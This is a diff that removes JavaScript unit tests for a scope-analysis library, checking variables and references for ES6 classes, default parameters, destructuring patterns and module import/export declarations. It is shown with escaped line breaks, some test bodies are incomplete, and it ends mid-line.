expect(scope.variables[1].name).to.be.equal('yuyushiki');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('yuyushiki');<\n>-        expect(scope.type).to.be.equal('class');<\n>-        expect(scope.block.type).to.be.equal('ClassExpression');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('yuyushiki');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('yuyushiki');<\n>-    it('regression #49'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.block.type).to.be.equal('Program');<\n>-        expect(scope.variables[0].name).to.be.equal('Shoe');<\n>-        expect(scope.variables[1].name).to.be.equal('shoe');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('shoe');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('Shoe');<\n>-const expect = require('chai').expect;<\n>-const espree = require('../third_party/espree');<\n>-const analyze = require('..').analyze;<\n>-describe('ES6 default parameters:'<c> function() {<\n>-    describe('a default parameter creates a writable reference for its initialization:'<c> function() {<\n>-            FunctionDeclaration: `function foo(a<c> b = 0) {}`<c><\n>-            FunctionExpression: `let foo = function(a<c> b = 0) {};`<c><\n>-            ArrowExpression: `let foo = (a<c> b = 0) => {};`<\n>-            (function(name<c> code) {<\n>-                it(name<c> function() {<\n>-                    const numVars = name === 'ArrowExpression' ? 2 : 3;<\n>-                    const ast = espree(code);<\n>-                    const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-                    expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-                    const scope = scopeManager.scopes[1];<\n>-                    expect(scope.variables).to.have.length(numVars);  // [arguments?<c> a<c> b]<\n>-                    expect(scope.references).to.have.length(1);<\n>-                    const reference = scope.references[0];<\n>-                    expect(reference.from).to.equal(scope);<\n>-                    expect(reference.identifier.name).to.equal('b');<\n>-                    expect(reference.resolved).to.equal(scope.variables[numVars - 1]);<\n>-                    expect(reference.writeExpr).to.not.be.undefined;<\n>-                    expect(reference.isWrite()).to.be.true;<\n>-                    expect(reference.isRead()).to.be.false;<\n>-                });<\n>-            })(name<c> code);<\n>-    describe('a default parameter creates a readable reference for references in right:'<c> function() {<\n>-            (function(name<c> code) {<\n>-                it(name<c> function() {<\n>-                    const numVars = name === 'ArrowExpression' ? 1 : 2;<\n>-                    const ast = espree(code);<\n>-                    const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-                    expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-                    const scope = scopeManager.scopes[1];<\n>-                    expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>-                    expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-                    const reference = scope.references[1];<\n>-                    expect(reference.from).to.equal(scope);<\n>-                    expect(reference.identifier.name).to.equal('a');<\n>-                    expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>-                    expect(reference.writeExpr).to.be.undefined;<\n>-                    expect(reference.isWrite()).to.be.false;<\n>-                    expect(reference.isRead()).to.be.true;<\n>-                });<\n>-            })(name<c> code);<\n>-    describe('a default parameter creates a readable reference for references in right (for const):'<c> function() {<\n>-            (function(name<c> code) {<\n>-                it(name<c> function() {<\n>-                    const numVars = name === 'ArrowExpression' ? 1 : 2;<\n>-                    const ast = espree(code);<\n>-                    const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-                    expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-                    const scope = scopeManager.scopes[1];<\n>-                    expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>-                    expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-                    const reference = scope.references[1];<\n>-                    expect(reference.from).to.equal(scope);<\n>-                    expect(reference.identifier.name).to.equal('a');<\n>-                    expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>-                    expect(reference.writeExpr).to.be.undefined;<\n>-                    expect(reference.isWrite()).to.be.false;<\n>-                    expect(reference.isRead()).to.be.true;<\n>-                });<\n>-            })(name<c> code);<\n>-    describe('a default parameter creates a readable reference for references in right (partial):'<c> function() {<\n>-            (function(name<c> code) {<\n>-                it(name<c> function() {<\n>-                    const numVars = name === 'ArrowExpression' ? 1 : 2;<\n>-                    const ast = espree(code);<\n>-                    const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-                    expect(scopeManager.scopes).to.have.length(2);  // [global<c> foo]<\n>-                    const scope = scopeManager.scopes[1];<\n>-                    expect(scope.variables).to.have.length(numVars);  // [arguments?<c> b]<\n>-                    expect(scope.references).to.have.length(2);  // [b<c> a]<\n>-                    const reference = scope.references[1];<\n>-                    expect(reference.from).to.equal(scope);<\n>-                    expect(reference.identifier.name).to.equal('a');<\n>-                    expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>-                    expect(reference.writeExpr).to.be.undefined;<\n>-                    expect(reference.isWrite()).to.be.false;<\n>-                    expect(reference.isRead()).to.be.true;<\n>-                });<\n>-            })(name<c> code);<\n>-    describe('a default parameter creates a readable reference for references in right\'s nested scope:'<c> function() {<\n>-            (function(name<c> code) {<\n>-                it(name<c> function() {<\n>-                    const ast = espree(code);<\n>-                    const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>-                    expect(scopeManager.scopes).to.have.length(3);  // [global<c> foo<c> anonymous]<\n>-                    const scope = scopeManager.scopes[2];<\n>-                    expect(scope.variables).to.have.length(1);  // [arguments]<\n>-                    expect(scope.references).to.have.length(1);  // [a]<\n>-                    const reference = scope.references[0];<\n>-                    expect(reference.from).to.equal(scope);<\n>-                    expect(reference.identifier.name).to.equal('a');<\n>-                    expect(reference.resolved).to.equal(scopeManager.scopes[0].variables[0]);<\n>-                    expect(reference.writeExpr).to.be.undefined;<\n>-                    expect(reference.isWrite()).to.be.false;<\n>-                    expect(reference.isRead()).to.be.true;<\n>-                });<\n>-            })(name<c> code);<\n>-const expect = require('chai').expect;<\n>-const harmony = require('../third_party/esprima');<\n>-const espree = require('../third_party/espree');<\n>-const analyze = require('..').analyze;<\n>-describe('ES6 destructuring assignments'<c> function() {<\n>-    it('Pattern in var in ForInStatement'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal('array');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('a');<\n>-        expect(scope.variables[2].name).to.be.equal('b');<\n>-        expect(scope.variables[3].name).to.be.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('a');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('b');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('c');<\n>-        expect(scope.references[3].identifier.name).to.be.equal('array');<\n>-    it('Pattern in let in ForInStatement'<c> function() {<\n>-        expect(scope.type).to.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal('array');<\n>-        expect(scope.type).to.equal('TDZ');<\n>-        expect(scope.variables[0].name).to.equal('a');<\n>-        expect(scope.variables[1].name).to.equal('b');<\n>-        expect(scope.variables[2].name).to.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.equal('array');<\n>-        expect(scope.type).to.equal('for');<\n>-        expect(scope.variables[0].name).to.equal('a');<\n>-        expect(scope.variables[1].name).to.equal('b');<\n>-        expect(scope.variables[2].name).to.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.equal('a');<\n>-        expect(scope.references[1].identifier.name).to.equal('b');<\n>-        expect(scope.references[2].identifier.name).to.equal('c');<\n>-    it('Pattern with default values in var in ForInStatement'<c> function() {<\n>-        expect(scope.type).to.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal('d');<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal('array');<\n>-        expect(scope.type).to.equal('function');<\n>-        expect(scope.variables[0].name).to.equal('arguments');<\n>-        expect(scope.variables[1].name).to.equal('a');<\n>-        expect(scope.variables[2].name).to.equal('b');<\n>-        expect(scope.variables[3].name).to.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.equal('c');<\n>-        expect(scope.references[0].writeExpr.name).to.equal('d');<\n>-        expect(scope.references[1].identifier.name).to.equal('d');<\n>-        expect(scope.references[2].identifier.name).to.equal('a');<\n>-        expect(scope.references[3].identifier.name).to.equal('b');<\n>-        expect(scope.references[4].identifier.name).to.equal('c');<\n>-        expect(scope.references[4].writeExpr.name).to.equal('array');<\n>-        expect(scope.references[5].identifier.name).to.equal('array');<\n>-    it('Pattern with default values in let in ForInStatement'<c> function() {<\n>-        expect(scope.type).to.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal('array');<\n>-        expect(scope.implicit.left[0].from.type).to.equal('TDZ');<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal('d');<\n>-        expect(scope.implicit.left[1].from.type).to.equal('for');<\n>-        expect(scope.type).to.equal('TDZ');<\n>-        expect(scope.variables[0].name).to.equal('a');<\n>-        expect(scope.variables[1].name).to.equal('b');<\n>-        expect(scope.variables[2].name).to.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.equal('array');<\n>-        expect(scope.type).to.equal('for');<\n>-        expect(scope.variables[0].name).to.equal('a');<\n>-        expect(scope.variables[1].name).to.equal('b');<\n>-        expect(scope.variables[2].name).to.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.equal('c');<\n>-        expect(scope.references[0].writeExpr.name).to.equal('d');<\n>-        expect(scope.references[1].identifier.name).to.equal('d');<\n>-        expect(scope.references[2].identifier.name).to.equal('a');<\n>-        expect(scope.references[2].writeExpr.name).to.equal('array');<\n>-        expect(scope.references[3].identifier.name).to.equal('b');<\n>-        expect(scope.references[3].writeExpr.name).to.equal('array');<\n>-        expect(scope.references[4].identifier.name).to.equal('c');<\n>-        expect(scope.references[4].writeExpr.name).to.equal('array');<\n>-    it('Pattern with nested default values in var in ForInStatement'<c> function() {<\n>-        expect(scope.type).to.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal('d');<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal('e');<\n>-        expect(scope.implicit.left[2].identifier.name).to.equal('array');<\n>-        expect(scope.type).to.equal('function');<\n>-        expect(scope.variables[0].name).to.equal('arguments');<\n>-        expect(scope.variables[1].name).to.equal('a');<\n>-        expect(scope.variables[2].name).to.equal('b');<\n>-        expect(scope.variables[3].name).to.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.equal('b');<\n>-        expect(scope.references[0].writeExpr.name).to.equal('e');<\n>-        expect(scope.references[1].identifier.name).to.equal('c');<\n>-        expect(scope.references[1].writeExpr.name).to.equal('e');<\n>-        expect(scope.references[2].identifier.name).to.equal('c');<\n>-        expect(scope.references[2].writeExpr.name).to.equal('d');<\n>-        expect(scope.references[3].identifier.name).to.equal('d');<\n>-        expect(scope.references[4].identifier.name).to.equal('e');<\n>-        expect(scope.references[5].identifier.name).to.equal('a');<\n>-        expect(scope.references[5].writeExpr.name).to.equal('array');<\n>-        expect(scope.references[6].identifier.name).to.equal('b');<\n>-        expect(scope.references[6].writeExpr.name).to.equal('array');<\n>-        expect(scope.references[7].identifier.name).to.equal('c');<\n>-        expect(scope.references[7].writeExpr.name).to.equal('array');<\n>-        expect(scope.references[8].identifier.name).to.equal('array');<\n>-    it('Pattern with nested default values in let in ForInStatement'<c> function() {<\n>-        expect(scope.type).to.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal('array');<\n>-        expect(scope.implicit.left[0].from.type).to.equal('TDZ');<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal('d');<\n>-        expect(scope.implicit.left[1].from.type).to.equal('for');<\n>-        expect(scope.implicit.left[2].identifier.name).to.equal('e');<\n>-        expect(scope.implicit.left[2].from.type).to.equal('for');<\n>-        expect(scope.type).to.equal('TDZ');<\n>-        expect(scope.variables[0].name).to.equal('a');<\n>-        expect(scope.variables[1].name).to.equal('b');<\n>-        expect(scope.variables[2].name).to.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.equal('array');<\n>-        expect(scope.type).to.equal('for');<\n>-        expect(scope.variables[0].name).to.equal('a');<\n>-        expect(scope.variables[1].name).to.equal('b');<\n>-        expect(scope.variables[2].name).to.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.equal('b');<\n>-        expect(scope.references[0].writeExpr.name).to.equal('e');<\n>-        expect(scope.references[1].identifier.name).to.equal('c');<\n>-        expect(scope.references[1].writeExpr.name).to.equal('e');<\n>-        expect(scope.references[2].identifier.name).to.equal('c');<\n>-        expect(scope.references[2].writeExpr.name).to.equal('d');<\n>-        expect(scope.references[3].identifier.name).to.equal('d');<\n>-        expect(scope.references[4].identifier.name).to.equal('e');<\n>-        expect(scope.references[5].identifier.name).to.equal('a');<\n>-        expect(scope.references[5].writeExpr.name).to.equal('array');<\n>-        expect(scope.references[6].identifier.name).to.equal('b');<\n>-        expect(scope.references[6].writeExpr.name).to.equal('array');<\n>-        expect(scope.references[7].identifier.name).to.equal('c');<\n>-        expect(scope.references[7].writeExpr.name).to.equal('array');<\n>-    it('Pattern with default values in var in ForInStatement (separate declarations)'<c> function() {<\n>-        expect(scope.type).to.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal('d');<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal('array');<\n>-        expect(scope.type).to.equal('function');<\n>-        expect(scope.variables[0].name).to.equal('arguments');<\n>-        expect(scope.variables[1].name).to.equal('a');<\n>-        expect(scope.variables[2].name).to.equal('b');<\n>-        expect(scope.variables[3].name).to.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.equal('a');<\n>-        expect(scope.references[1].identifier.name).to.equal('b');<\n>-        expect(scope.references[2].identifier.name).to.equal('c');<\n>-        expect(scope.references[2].writeExpr.name).to.equal('d');<\n>-        expect(scope.references[3].identifier.name).to.equal('c');<\n>-        expect(scope.references[3].writeExpr.name).to.equal('array');<\n>-        expect(scope.references[4].identifier.name).to.equal('d');<\n>-        expect(scope.references[5].identifier.name).to.equal('array');<\n>-    it('Pattern with default values in var in ForInStatement (separate declarations and with MemberExpression)'<c> function() {<\n>-        expect(scope.type).to.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal('d');<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal('array');<\n>-        expect(scope.type).to.equal('function');<\n>-        expect(scope.variables[0].name).to.equal('arguments');<\n>-        expect(scope.variables[1].name).to.equal('obj');<\n>-        expect(scope.references[0].identifier.name).to.equal('obj');  // obj.a<\n>-        expect(scope.references[1].identifier.name).to.equal('obj');  // obj.b<\n>-        expect(scope.references[2].identifier.name).to.equal('obj');  // obj.c<\n>-        expect(scope.references[3].identifier.name).to.equal('d');<\n>-        expect(scope.references[4].identifier.name).to.equal('array');<\n>-    it('ArrayPattern in var'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal('array');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('a');<\n>-        expect(scope.variables[2].name).to.be.equal('b');<\n>-        expect(scope.variables[3].name).to.be.equal('c');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('a');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('b');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('c');<\n>-        expect(scope.references[3].identifier.name).to.be.equal('array');<\n>-    it('SpreadElement in var'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal('array');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('a');<\n>-        expect(scope.variables[2].name).to.be.equal('b');<\n>-        expect(scope.variables[3].name).to.be.equal('rest');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('a');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('b');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('rest');<\n>-        expect(scope.references[3].identifier.name).to.be.equal('array');<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal('array');<\n>-        expect(scope.type).to.be.equal('function');<\n>-            'arguments'<c><\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<c><\n>-            'rest'<\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<c><\n>-            'rest'<\n>-        expect(scope.references[5].identifier.name).to.be.equal('array');<\n>-    it('ObjectPattern in var'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal('object');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('shorthand');<\n>-        expect(scope.variables[2].name).to.be.equal('value');<\n>-        expect(scope.variables[3].name).to.be.equal('world');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('shorthand');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('value');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('world');<\n>-        expect(scope.references[3].identifier.name).to.be.equal('object');<\n>-    it('complex pattern in var'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal('object');<\n>-        expect(scope.type).to.be.equal('function');<\n>-            'arguments'<c><\n>-            'shorthand'<c><\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<c><\n>-            'e'<c><\n>-            'world'<\n>-            'shorthand'<c><\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<c><\n>-            'e'<c><\n>-            'world'<\n>-        expect(scope.references[7].identifier.name).to.be.equal('object');<\n>-    it('ArrayPattern in AssignmentExpression'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'array'<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('a');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('b');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('c');<\n>-        expect(scope.references[3].identifier.name).to.be.equal('array');<\n>-    it('ArrayPattern with MemberExpression in AssignmentExpression'<c> function() {<\n>-        expect(scope.type).to.equal('global');<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal('array');<\n>-        expect(scope.type).to.equal('function');<\n>-        expect(scope.variables[0].name).to.equal('arguments');<\n>-        expect(scope.variables[1].name).to.equal('obj');<\n>-        expect(scope.references[0].identifier.name).to.equal('obj');<\n>-        expect(scope.references[1].identifier.name).to.equal('obj');<\n>-        expect(scope.references[2].identifier.name).to.equal('obj');<\n>-        expect(scope.references[3].identifier.name).to.equal('array');<\n>-    it('SpreadElement in AssignmentExpression'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-            'a'<c><\n>-            'b'<c><\n>-            'rest'<c><\n>-            'array'<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('a');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('b');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('rest');<\n>-        expect(scope.references[3].identifier.name).to.be.equal('array');<\n>-        expect(scope.type).to.be.equal('global');<\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<c><\n>-            'rest'<c><\n>-            'array'<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<c><\n>-            'rest'<\n>-        expect(scope.references[5].identifier.name).to.be.equal('array');<\n>-    it('SpreadElement with MemberExpression in AssignmentExpression'<c> function() {<\n>-        expect(scope.type).to.equal('global');<\n>-            'a'<c><\n>-            'b'<c><\n>-            'obj'<c><\n>-            'array'<\n>-        expect(scope.type).to.equal('function');<\n>-        expect(scope.variables[0].name).to.equal('arguments');<\n>-        expect(scope.references[0].identifier.name).to.equal('a');<\n>-        expect(scope.references[1].identifier.name).to.equal('b');<\n>-        expect(scope.references[2].identifier.name).to.equal('obj');<\n>-        expect(scope.references[3].identifier.name).to.equal('array');<\n>-    it('ObjectPattern in AssignmentExpression'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-            'shorthand'<c><\n>-            'value'<c><\n>-            'world'<c><\n>-            'object'<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('shorthand');<\n>-        expect(scope.references[1].identifier.name).to.be.equal('value');<\n>-        expect(scope.references[2].identifier.name).to.be.equal('world');<\n>-        expect(scope.references[3].identifier.name).to.be.equal('object');<\n>-    it('complex pattern in AssignmentExpression'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-            'shorthand'<c><\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<c><\n>-            'e'<c><\n>-            'world'<c><\n>-            'object'<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-            'shorthand'<c><\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<c><\n>-            'e'<c><\n>-            'world'<\n>-        expect(scope.references[7].identifier.name).to.be.equal('object');<\n>-    it('ArrayPattern in parameters'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('array');<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal('array');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('a');<\n>-        expect(scope.variables[2].name).to.be.equal('b');<\n>-        expect(scope.variables[3].name).to.be.equal('c');<\n>-    it('SpreadElement in parameters'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('array');<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal('array');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('a');<\n>-        expect(scope.variables[2].name).to.be.equal('b');<\n>-        expect(scope.variables[3].name).to.be.equal('rest');<\n>-        expect(scope.variables[4].name).to.be.equal('rest2');<\n>-    it('ObjectPattern in parameters'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('object');<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal('object');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-        expect(scope.variables[1].name).to.be.equal('shorthand');<\n>-        expect(scope.variables[2].name).to.be.equal('value');<\n>-        expect(scope.variables[3].name).to.be.equal('world');<\n>-    it('complex pattern in parameters'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('object');<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal('object');<\n>-        expect(scope.type).to.be.equal('function');<\n>-            'arguments'<c><\n>-            'shorthand'<c><\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<c><\n>-            'e'<c><\n>-            'world'<\n>-    it('default values and patterns in var'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('function');<\n>-            'arguments'<c><\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<c> // assign 20<\n>-            'd'<c> // assign array<\n>-            'array'<\n>-    it('default values containing references and patterns in var'<c> function() {<\n>-        expect(scope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('function');<\n>-            'arguments'<c><\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<\n>-            'a'<c> // assign array<\n>-            'b'<c> // assign array<\n>-            'c'<c> // assign array<\n>-            'd'<c> // assign e<\n>-            'd'<c> // assign array<\n>-            'e'<c><\n>-            'array'<\n>-    it('nested default values containing references and patterns in var'<c> function() {<\n>-        expect(scope.type).to.equal('global');<\n>-        expect(scope.type).to.equal('function');<\n>-            'arguments'<c><\n>-            'a'<c><\n>-            'b'<c><\n>-            'c'<c><\n>-            'd'<\n>-            'a'<c> // assign array<\n>-            'b'<c> // assign array<\n>-            'c'<c> // assign f<\n>-            'c'<c> // assign array<\n>-            'd'<c> // assign f<\n>-            'd'<c> // assign e<\n>-            'd'<c> // assign array<\n>-            'e'<c><\n>-            'f'<c><\n>-            'array'<\n>-const expect = require('chai').expect;<\n>-const espree = require('../third_party/espree');<\n>-const analyze = require('..').analyze;<\n>-describe('export declaration'<c> function() {<\n>-    it('should create vairable bindings'<c> function() {<\n>-        const ast = espree(`export var v;`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-        expect(scope.variables[0].name).to.be.equal('v');<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal('Variable');<\n>-    it('should create function declaration bindings'<c> function() {<\n>-        const ast = espree(`export default function f(){};`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-        expect(scope.variables[0].name).to.be.equal('f');<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal('FunctionName');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-    it('should export function expression'<c> function() {<\n>-        const ast = espree(`export default function(){};`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-        expect(scope.type).to.be.equal('function');<\n>-        expect(scope.variables[0].name).to.be.equal('arguments');<\n>-    it('should export literal'<c> function() {<\n>-        const ast = espree(`export default 42;`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-    it('should refer exported references#1'<c> function() {<\n>-        const ast = espree(`export {x};`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('x');<\n>-    it('should refer exported references#2'<c> function() {<\n>-        const ast = espree(`export {v as x};`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-        expect(scope.references[0].identifier.name).to.be.equal('v');<\n>-    it('should not refer exported references from other source#1'<c> function() {<\n>-        const ast = espree(`export {x} from ""mod"";`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-    it('should not refer exported references from other source#2'<c> function() {<\n>-        const ast = espree(`export {v as x} from ""mod"";`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-    it('should not refer exported references from other source#3'<c> function() {<\n>-        const ast = espree(`export * from ""mod"";`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-const expect = require('chai').expect;<\n>-const espree = require('../third_party/espree');<\n>-const analyze = require('..').analyze;<\n>-describe('import declaration'<c> function() {<\n>-    it('should import names from source'<c> function() {<\n>-        const ast = espree(`import v from ""mod"";`<c> {sourceType: 'module'});<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-        expect(scope.variables[0].name).to.be.equal('v');<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal('ImportBinding');<\n>-    it('should import namespaces'<c> function() {<\n>-        const ast = espree( `import * as ns from ""mod"";`<c> {sourceType: 'module'<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 6<c> sourceType: 'module'});<\n>-        expect(globalScope.type).to.be.equal('global');<\n>-        expect(scope.type).to.be.equal('module');<\n>-        expect(scope.variables[0].name).to.be.equal('ns');<\n>-        expect(scope.variables[0].defs[0].type).to.be.equal('ImportBinding');<\n>-    it('should import insided names#1'<c> function() {<\n>-        const ast = espree(`import {x} from ""mod"";`<c> {sourceType: 'module'<\n>-        const scopeManager = analyze(ast<c> {ecmaVersion: 